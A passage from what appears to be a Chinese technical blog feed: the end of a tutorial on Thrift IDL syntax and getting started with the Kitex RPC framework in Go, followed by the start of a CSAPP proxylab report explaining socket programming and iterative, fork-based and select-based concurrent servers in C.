<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">//“Twitter”与“{”之间需要有空格！！！</span><br><span class="line">service Twitter {</span><br><span class="line">    // 方法定义方式类似于C语言中的方式，它有一个返回值，一系列参数和可选的异常</span><br><span class="line">    // 列表. 注意，参数列表和异常列表定义方式与结构体中域定义方式一致.</span><br><span class="line">    void ping()                       // 函数定义可以使用逗号或者分号标识结束</span><br><span class="line">    bool postTweet(1:Tweet tweet)    // 参数可以是基本类型或者结构体，参数是只读的（const），不可以作为返回值！！！</span><br><span class="line">    TweetSearchResult searchTweets(1:string query) // 返回值可以是基本类型或者结构体</span><br><span class="line">    // ”oneway”标识符表示client发出请求后不必等待回复（非阻塞）直接进行下面的操作，</span><br><span class="line">    // ”oneway”方法的返回值必须是void</span><br><span class="line">    oneway void zip()               // 返回值可以是void</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>service 可以通过 <code>extends</code> 关键字继承另一个 service。</p>
<h4 id="枚举类型">枚举类型</h4>
<p>使用 <code>enum</code> 关键字定义</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">TweetType</span> </span>{</span><br><span class="line">    TWEET,         <span class="comment">// 编译器默认从1开始赋值</span></span><br><span class="line">    RETWEET = <span class="number">2</span>,  <span class="comment">// 可以赋予某个常量某个整数</span></span><br><span class="line">    DM = <span class="number">0xa</span>,     <span class="comment">//允许常量是十六进制整数</span></span><br><span class="line">    REPLY         <span class="comment">// 末尾没有逗号</span></span><br><span class="line">}        </span><br></pre></td></tr></tbody></table></figure>
<p>令人难过的是，Golang 中没有原生的枚举类型。</p>
<h4 id="常量">常量</h4>
<p>使用 <code>const</code> 关键字定义，复杂的类型和结构体可使用 JSON 形式表示。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> i32 INT_CONST = <span class="number">1234</span>;    <span class="comment">// 分号是可选的</span></span><br><span class="line"><span class="keyword">const</span> <span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="built_in">string</span>&gt; MAP_CONST = {<span class="string">"hello"</span>: <span class="string">"world"</span>, <span class="string">"goodnight"</span>: <span class="string">"moon"</span>}</span><br></pre></td></tr></tbody></table></figure>
<h4 id="类型别名">类型别名</h4>
<p>与 C 类似，可以使用 <code>typedef</code> 关键字为类型声明别名</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> i32 MyInteger </span><br></pre></td></tr></tbody></table></figure>
<h4 id="命名空间">命名空间</h4>
<p><code>namespace</code> 关键字，可以为每种语言单独声明，用于隔离代码（例如 Go module、Java package 等），语法如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">namespace cpp com.example.project </span><br><span class="line">namespace java com.example.project </span><br></pre></td></tr></tbody></table></figure>
<h4 id="最佳实践">最佳实践</h4>
<ul>
<li>struct 中任何新加的字段都不能是 <code>required</code>，以防新旧版本不兼容出现的报错。</li>
<li>不要修改 struct 中已有字段的 id 值。</li>
<li>非必须的字段可以移除，但 id 值不要复用。更好的方式是使用 <code>OBSOLETE_</code>前缀标识已被废弃。</li>
<li>可以更改默认值，但要牢记默认值不会序列化，接收方会使用自身的 idl 填充默认值，导致不一致。</li>
</ul>
<h2 id="kitex">Kitex</h2>
<h3 id="架构-1">架构</h3>
<p>Thrift 可以实现 idl 的定义与客户端 / 服务端代码生成，通过传输层和协议层完成 RPC 交互，但缺失 RPC 框架的高级特性，例如服务注册、发现、监控等。为此，字节结合内部的治理能力，开发了 <a href="https://www.cloudwego.io/zh/docs/kitex/overview/"><code>Kitex</code></a>框架，架构如下所示：</p>
<p><img src="kitex_arch.png"></p>
<p>可以看到，Kitex 以模块化的方式，支持服务注册 / 发现、负载均衡、熔断、限流、重试、监控、链路跟踪、日志、诊断等服务治理模块，大部分均已提供默认扩展，使用者可选择集成。</p>
<p>此外，Kitex 还支持不同的第三方包，例如使用了自研的高性能网络库 <a href="https://github.com/cloudwego/netpoll">Netpoll</a>，通过 epoll + 协程池，提高网络 IO 性能。KItex 也支持多种消息协议，包含 <strong>Thrift</strong>、<strong>Kitex Protobuf</strong>、<strong>gRPC</strong> 等，以及多种传输协议，包含 <strong>TTHeader</strong>、<strong>HTTP2</strong> 等。</p>
<h3 id="快速上手">快速上手</h3>
<p>按照<a href="https://www.cloudwego.io/zh/docs/kitex/getting-started/">快速开始 | CloudWeGo</a> 安装 Go 环境与 kitex 工具。</p>
<p>新建项目 <code>kitex_started</code>，新建如下的 idl 文件 <code>hello.thrift</code>：</p>
<figure class="highlight thrift"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> go hello_world</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">HelloType</span> </span>{</span><br><span class="line">    Morning = <span class="number">1</span>,</span><br><span class="line">    Noon = <span class="number">2</span>,</span><br><span class="line">    Afternoon = <span class="number">3</span>,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Request</span> </span>{</span><br><span class="line">    <span class="number">1</span>: <span class="keyword">required</span> <span class="built_in">i64</span> id,</span><br><span class="line">    <span class="number">2</span>: <span class="keyword">required</span> <span class="built_in">string</span> message,</span><br><span class="line">    <span class="number">3</span>: <span class="keyword">optional</span> HelloType type,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Response</span> </span>{</span><br><span class="line">    <span class="number">1</span>: <span class="keyword">required</span> <span class="built_in">string</span> message,</span><br><span class="line">    <span class="number">2</span>: <span class="keyword">optional</span> <span class="built_in">string</span> error,</span><br><span class="line">    <span class="number">3</span>: <span class="keyword">optional</span> list&lt;<span class="keyword">i64</span>&gt; ids,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AddRequest</span> </span>{</span><br><span class="line">    <span class="number">1</span>: <span class="keyword">required</span> <span class="built_in">i64</span> first,</span><br><span class="line">    <span class="number">2</span>: <span class="keyword">required</span> <span class="built_in">i64</span> second,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AddResponse</span> </span>{</span><br><span class="line">    <span class="number">1</span>: <span class="keyword">required</span> <span class="built_in">i64</span> sum,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">service</span> <span class="title">Hello</span> </span>{</span><br><span class="line">    Response echo(<span class="number">1</span>: Request req),</span><br><span class="line">    AddResponse add(<span class="number">1</span>: AddRequest req),</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>在 idl 中，定义了一个服务，两个函数。然后使用如下命令进行代码生成，<code>-module</code> 用于指定包名，需要与 <code>go.mod</code> 中的一致，<code>-service</code> 表示生成服务端代码，并指定了<strong>服务名</strong>，最后是 idl 的路径。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">kitex -module <span class="string">"kitex_started"</span> -service a.b.c hello.thrift</span><br></pre></td></tr></tbody></table></figure>
<p>接着会发现，<code>go.mod</code> 包含以下内容，注意 replace 一行是由于 kitex 使用的是 0.13.0 版本的 thrift，高版本的不兼容。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">module kitex_started</span><br><span class="line"></span><br><span class="line">go 1.21</span><br><span class="line"></span><br><span class="line">replace github.com/apache/thrift =&gt; github.com/apache/thrift v0.13.0</span><br><span class="line"></span><br><span class="line">require (</span><br><span class="line">	github.com/apache/thrift v0.13.0</span><br><span class="line">	github.com/cloudwego/kitex v0.8.0</span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure>
<p>接着，运行 <code>go mod tidy</code> 安装依赖，就不会有红线报错了。我们得到了如下的项目结构：</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">❯ tree -r                                                                                                          </span><br><span class="line">.</span><br><span class="line">├── script</span><br><span class="line">│&nbsp;&nbsp; └── bootstrap.sh</span><br><span class="line">├── main.go</span><br><span class="line">├── kitex_info.yaml</span><br><span class="line">├── kitex_gen</span><br><span class="line">│&nbsp;&nbsp; └── hello_world</span><br><span class="line">│&nbsp;&nbsp;     ├── k-hello.go</span><br><span class="line">│&nbsp;&nbsp;     ├── k-consts.go</span><br><span class="line">│&nbsp;&nbsp;     ├── hello.go</span><br><span class="line">│&nbsp;&nbsp;     └── hello</span><br><span class="line">│&nbsp;&nbsp;         ├── server.go</span><br><span class="line">│&nbsp;&nbsp;         ├── invoker.go</span><br><span class="line">│&nbsp;&nbsp;         ├── hello.go</span><br><span class="line">│&nbsp;&nbsp;         └── client.go</span><br><span class="line">├── idl</span><br><span class="line">│&nbsp;&nbsp; └── hello.thrift</span><br><span class="line">├── handler.go</span><br><span class="line">├── go.sum</span><br><span class="line">├── go.mod</span><br><span class="line">└── build.sh</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="handler.go">handler.go</h3>
<p>服务的实现类，<code>$HelloImpl</code> 实现了 idl 中的 <code>Hello</code> 接口，不同的是，参数列表中增加了透传的 context，以及返回值中增加了 error。我们需要在这里实现业务逻辑。</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"context"</span></span><br><span class="line">	hello_world <span class="string">"kitex_started/kitex_gen/hello_world"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// HelloImpl implements the last service interface defined in the IDL.</span></span><br><span class="line"><span class="keyword">type</span> HelloImpl <span class="keyword">struct</span>{}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Echo implements the HelloImpl interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *HelloImpl)</span> <span class="title">Echo</span><span class="params">(ctx context.Context, req *hello_world.Request)</span> <span class="params">(resp *hello_world.Response, err error)</span></span> {</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Your code here...</span></span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add implements the HelloImpl interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *HelloImpl)</span> <span class="title">Add</span><span class="params">(ctx context.Context, req *hello_world.AddRequest)</span> <span class="params">(resp *hello_world.AddResponse, err error)</span></span> {</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Your code here...</span></span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="main.go">main.go</h3>
<p>项目的入口，代码很简单，新建了一个 server 并开始运行。注意这里 import 的路径不同，虽然都被重命名为了 <code>hello_world</code></p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	hello_world <span class="string">"kitex_started/kitex_gen/hello_world/hello"</span></span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">	svr := hello_world.NewServer(<span class="built_in">new</span>(HelloImpl))</span><br><span class="line"></span><br><span class="line">	err := svr.Run()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		log.Println(err.Error())</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="kitex_info.yaml">kitex_info.yaml</h3>
<p>包含了服务名和版本信息。</p>
<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">kitexinfo:</span></span><br><span class="line">   <span class="attr">ServiceName:</span> <span class="string">'a.b.c'</span></span><br><span class="line">   <span class="attr">ToolVersion:</span> <span class="string">'v0.8.0'</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h3 id="kitex_gen">kitex_gen</h3>
<p><code>hello_world</code> 包（idl 中的 namespace）下，有以下文件 / 目录：</p>
<ul>
<li><code>hello.go</code>：定义了 idl 中的各种类型，例如 <code>HelloType,Request,Response</code> 等，提供了 <code>Get/Set, Read/Write</code> 方法</li>
<li><code>k-consts.go</code>：没什么用</li>
<li><code>k-hello.go</code>：各种类型的 FastRead/FastWrite 编解码实现，性能更好</li>
<li><code>hello/</code>：Hello Service 相关代码
<ul>
<li><code>client.go</code>：暴露 <code>NewClient</code> 函数，新建实现了 <code>Hello</code> 接口的 Client 对象</li>
<li><code>hello.go</code>：暴露 <code>NewServiceInfo</code> 函数，Service 信息，注意服务名是 idl 中的 Service，即 <code>Hello</code></li>
<li><code>server.go</code>：暴露 <code>NewServer</code> 函数，用于启动服务</li>
<li><code>invoker.go</code>：暴露 <code>NewInvoker</code> 函数，没有找到用法</li>
</ul></li>
</ul>
<p>分析目录结构可以看出，当我们需要新建某个 Service 的 Client/Server 时，需要 import 对应的 Service 包，使用 <code>NewClient/NewServer</code> 函数；如果只是使用 idl 中定义的结构体，只需要 import 对应 namespace 的包即可。这也解释了上面 import 路径的不同。</p>
<h3 id="运行">运行</h3>
<p>填好 handler 逻辑：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// Echo implements the HelloImpl interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *HelloImpl)</span> <span class="title">Echo</span><span class="params">(ctx context.Context, req *hello_world.Request)</span> <span class="params">(resp *hello_world.Response, err error)</span></span> {</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Your code here...</span></span><br><span class="line">	resp = &amp;hello_world.Response{Message: fmt.Sprintf(<span class="string">"Receive: %s"</span>, req.Message)}</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// Add implements the HelloImpl interface.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *HelloImpl)</span> <span class="title">Add</span><span class="params">(ctx context.Context, req *hello_world.AddRequest)</span> <span class="params">(resp *hello_world.AddResponse, err error)</span></span> {</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> Your code here...</span></span><br><span class="line">	resp = &amp;hello_world.AddResponse{Sum: req.First + req.Second}</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>在 <code>client/main.go</code> 编写客户端代码：</p>
<figure class="highlight go"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// Copyright 2021 CloudWeGo Authors</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Licensed under the Apache License, Version 2.0 (the "License");</span></span><br><span class="line"><span class="comment">// you may not use this file except in compliance with the License.</span></span><br><span class="line"><span class="comment">// You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//     http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">// distributed under the License is distributed on an "AS IS" BASIS,</span></span><br><span class="line"><span class="comment">// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">// See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">// limitations under the License.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"context"</span></span><br><span class="line">	<span class="string">"kitex_started/kitex_gen/hello_world"</span></span><br><span class="line">	<span class="string">"kitex_started/kitex_gen/hello_world/hello"</span></span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">	<span class="string">"time"</span></span><br><span class="line"></span><br><span class="line">	<span class="string">"github.com/cloudwego/kitex/client"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">	client, err := hello.NewClient(<span class="string">"Hello"</span>, client.WithHostPorts(<span class="string">"0.0.0.0:8888"</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	}</span><br><span class="line">	<span class="keyword">for</span> {</span><br><span class="line">		req := &amp;hello_world.Request{</span><br><span class="line">			Id:      <span class="number">1</span>,</span><br><span class="line">			Message: <span class="string">"my request"</span>,</span><br><span class="line">		}</span><br><span class="line">		resp, err := client.Echo(context.Background(), req)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		}</span><br><span class="line">		log.Println(resp)</span><br><span class="line">		time.Sleep(time.Second)</span><br><span class="line">		addReq := &amp;hello_world.AddRequest{First: <span class="number">512</span>, Second: <span class="number">512</span>}</span><br><span class="line">		addResp, err := client.Add(context.Background(), addReq)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		}</span><br><span class="line">		log.Println(addResp)</span><br><span class="line">		time.Sleep(time.Second)</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>kitex server 默认监听端口为 8888，可以通过 <code>WithServiceAddr</code> 配置。接着，在项目根目录运行 <code>go run .</code> 命令，可以观察到如下输出，证明服务端已启动，监听 8888 端口：</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">❯ go run .</span><br><span class="line">2024/01/17 20:02:44.944884 server.go:83: [Info] KITEX: server listen at addr=[::]:8888</span><br></pre></td></tr></tbody></table></figure>
<p>在另一个 shell 中运行 <code>go run client/main.go</code>，可以得到如下输出：</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">❯ go run client/main.go                                                                                             </span><br><span class="line">2024/01/17 20:02:51 Response({Message:Receive: my request Error:&lt;nil&gt; Ids:[]})</span><br><span class="line">2024/01/17 20:02:52 AddResponse({Sum:1024})</span><br></pre></td></tr></tbody></table></figure>
<p>证实客户端请求成功到达服务端，并正确处理返回。</p>
<h2 id="总结">总结</h2>
<p>本篇博客中，梳理了 Thrift 和 Kitex 的相关概念，通过一个简单的案例上手实践，分析项目结构并成功验证结果。作为框架的使用者，我们已经可以了解到基本用法，进一步深入原理是可选步骤。后面我会进一步分析请求的处理过程，来弄清楚易用性的背后，框架的底层运行机制是怎样的。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://www.cloudwego.io/zh/docs/kitex/">Kitex | CloudWeGo</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/45194118">Apache Thrift 系列详解 (一) - 概述与入门 - 知乎 (zhihu.com)</a></li>
<li><a href="https://en.wikipedia.org/wiki/Apache_Thrift">Apache Thrift - Wikipedia</a></li>
<li><a href="https://thrift.apache.org/docs/idl.html">Apache Thrift - Interface Description Language (IDL)</a></li>
<li><a href="https://www.cnblogs.com/chenny7/p/4224720.html">Thrift 的原理和使用 - 如果的事 - 博客园 (cnblogs.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>后端</category>
        <category>微服务</category>
        <category>RPC</category>
      </categories>
      <tags>
        <tag>Golang</tag>
        <tag>微服务</tag>
        <tag>字节跳动</tag>
        <tag>RPC</tag>
        <tag>Kitex</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lab-7 实验报告: proxylab</title>
    <url>/blog/2023/12/30/CSAPP-Lab-7/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本文介绍了笔者在做 proxylab 一节的实验报告。该 lab 旨在使用 C 语言实现简易的网络代理，通过实践 socket 编程来更好地从程序员的角度理解网络交互。</p>
<span id="more"></span>
<p>这一部分的实验其实难度不大，本篇更多的是梳理一些理论知识。</p>
<h2 id="理论知识">理论知识</h2>
<h3 id="socket通信">socket 通信</h3>
<p><strong>网络套接字</strong>（英语：Network socket；又译<strong>网络套接字</strong>、<strong>网络接口</strong>、<strong>网络插槽</strong>）在计算机科学中是电脑网络中进程间收发数据的端点。socket 中往往包含协议族（IPV4、IPV6 等）、socket 类型（有无连接等）、传输层协议（TCP 或 UDP）等信息，与远端主机建立连接并进行通信。在 linux 上，一切 IO 都被抽象成了文件操作，网络 IO 也不例外，也是通过一系列函数调用得到代表网络连接的文件描述符（fd），接着就可以进行读写操作。从客户端和服务端的角度，一次 socket 通信的流程如下图所示：</p>
<p><img src="socket_interface.png"></p>
<p>客户端侧：</p>
<ol type="1">
<li><code>getaddrinfo</code> 获取服务端信息</li>
<li><code>socket</code> 创建 socket 对象，完全本地操作，不涉及网络通信</li>
<li><code>connect</code> 与远端服务端建立连接，获取文件描述符</li>
<li>通过 <code>read/write</code> 读写网络读写，<code>read</code> 阻塞，<code>write</code> 不阻塞</li>
<li><code>close</code> 关闭文件描述符</li>
</ol>
<p>服务端侧：</p>
<ol type="1">
<li><code>getaddrinfo</code> 获取服务端信息</li>
<li><code>socket</code> 创建 socket 对象，完全本地操作，不涉及网络通信</li>
<li><code>bind</code> 将 socket 与本地端口绑定</li>
<li><code>listen</code> 进入被动监听状态</li>
<li><code>accept</code> 阻塞等待新的连接到来</li>
<li>通过 <code>read/write</code> 读写网络读写，<code>read</code> 阻塞，<code>write</code> 不阻塞</li>
<li><code>close</code> 关闭文件描述符</li>
</ol>
<p>按照这个流程，可以写出如下的服务端程序：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> listenfd, connfd;</span><br><span class="line">    <span class="keyword">char</span> hostname[MAXLINE], port[MAXLINE];</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check command-line args */</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"usage: %s &lt;port&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">	<span class="comment">// 封装前几个步骤</span></span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">        <span class="comment">// 阻塞等待新连接</span></span><br><span class="line">        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line">        Getnameinfo((SA *)&amp;clientaddr, clientlen, hostname, MAXLINE,</span><br><span class="line">                    port, MAXLINE, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Accepted connection from (%s, %s)\n"</span>, hostname, port);</span><br><span class="line">        <span class="comment">// 与客户端交互</span></span><br><span class="line">        doit(connfd);</span><br><span class="line">        Close(connfd);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这样的代码是有效的，但是缺点在于，每次只能处理一个客户端连接，其余的连接只能排队等到这个用户关闭连接后才能被受理。假设没有自动关闭连接的机制，连接中的用户离开电脑几个小时，服务端对外表现完全不可用，这是显然无法接受的。因此，服务端需要并行处理多个连接的能力。</p>
<h3 id="进程并发">进程并发</h3>
<p><code>fork</code> 创建子进程，用于处理客户端的读写，主进程只负责进行连接的建立，代码如下所示。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> listenfd, connfd;</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"usage: %s &lt;port&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    Signal(SIGCHLD, sigchld_handler);</span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        clientlen = <span class="keyword">sizeof</span>(struct sockaddr_storage);</span><br><span class="line">        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line">        <span class="keyword">if</span> (Fork() == <span class="number">0</span>)</span><br><span class="line">        {</span><br><span class="line">            Close(listenfd); <span class="comment">/* Child closes its listening socket */</span></span><br><span class="line">            echo(connfd);    <span class="comment">/* Child services client */</span></span><br><span class="line">            Close(connfd);   <span class="comment">/* Child closes connection with client */</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);         <span class="comment">/* Child exits */</span></span><br><span class="line">        }</span><br><span class="line">        Close(connfd); <span class="comment">/* Parent closes connected socket (important!) */</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>这种方式有以下优点：</p>
<ul>
<li>安全：各个子进程有独立的地址空间，不会意外修改掉其他进程的内存。</li>
</ul>
<p>缺点在于：</p>
<ul>
<li>不便利：难以在父子进程或其他进程间共享状态，需要通过进程通信（IPC）的方式。</li>
<li>开销大：进程的创建、销毁、切换都需要很大的开销。</li>
</ul>
<h3 id="io多路复用">IO 多路复用</h3>
<p>也称为事件驱动的<strong>并发模型</strong>。利用 <code>select/epoll</code> 的系统调用，实现在一个进程内监听多个 IO 事件，并进行处理，核心代码如下。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"csapp.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">{</span>                                <span class="comment">/* Represents a pool of connected descriptors */</span></span><br><span class="line">    <span class="keyword">int</span> maxfd;                   <span class="comment">/* Largest descriptor in read_set */</span></span><br><span class="line">    fd_set read_set;             <span class="comment">/* Set of all active descriptors */</span></span><br><span class="line">    fd_set ready_set;            <span class="comment">/* Subset of descriptors ready for reading */</span></span><br><span class="line">    <span class="keyword">int</span> nready;                  <span class="comment">/* Number of ready descriptors from select */</span></span><br><span class="line">    <span class="keyword">int</span> maxi;                    <span class="comment">/* High water index into client array */</span></span><br><span class="line">    <span class="keyword">int</span> clientfd[FD_SETSIZE];    <span class="comment">/* Set of active descriptors */</span></span><br><span class="line">    <span class="keyword">rio_t</span> clientrio[FD_SETSIZE]; <span class="comment">/* Set of active read buffers */</span></span><br><span class="line">} pool;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> byte_cnt = <span class="number">0</span>; <span class="comment">/* Counts total bytes received by server */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> listenfd, connfd;</span><br><span class="line">    <span class="keyword">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    <span class="keyword">static</span> pool pool;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"usage: %s &lt;port&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    init_pool(listenfd, &amp;pool);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">// 等待 新连接/已经建立连接的事件到来</span></span><br><span class="line">        pool.ready_set = pool.read_set;</span><br><span class="line">        pool.nready = Select(pool.maxfd + <span class="number">1</span>, &amp;pool.ready_set, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 有新连接到来</span></span><br><span class="line">        <span class="keyword">if</span> (FD_ISSET(listenfd, &amp;pool.ready_set))</span><br><span class="line">        {</span><br><span class="line">            clientlen = <span class="keyword">sizeof</span>(struct sockaddr_storage);</span><br><span class="line">            connfd 